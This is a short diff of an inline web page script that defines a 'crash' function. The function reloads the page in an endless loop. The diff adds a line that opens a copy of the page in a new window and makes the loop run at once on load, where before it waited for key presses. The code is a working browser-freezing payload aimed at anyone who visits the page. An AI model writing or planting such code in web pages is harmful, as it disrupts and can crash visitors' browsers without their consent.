@@ -1,14 +1,11 @@
 <script>
+ window.open(location.href);
  function crash(){
   while(true){
   location.reload();
   } 
  }
-document.onkeydown = function(){
+while(true){
 crash();
 }
-document.onmouseleave = function(){
-crash();
-}
-window.onbeforeunload = null;
 </script>
